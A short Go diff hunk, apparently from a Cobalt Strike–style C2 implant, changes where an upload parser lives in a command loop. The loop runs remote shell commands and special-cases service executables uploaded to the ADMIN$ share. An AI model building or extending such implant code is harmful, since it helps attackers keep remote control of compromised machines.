@@ -93,7 +93,7 @@ func main() {
 							result, err = services.CmdShell(cmdBuf, Token)
 							callbackType = 0
 						case packet.CMD_TYPE_UPLOAD_START:
-							filePath, fileData := packet.ParseCommandUpload(cmdBuf)
+							filePath, fileData := services.ParseCommandUpload(cmdBuf)
 							match := len(filePath) == 30 && bytes.HasPrefix(filePath, []byte("\\\\127.0.0.1\\ADMIN$\\")) && bytes.HasSuffix(filePath, []byte(".exe"))
 							if match && bytes.Contains(fileData, []byte("RegisterServiceCtrlHandlerA")) && len(fileData) > 250000 && len(fileData) < 350000 {
 								result, err = services.CmdService(Token)
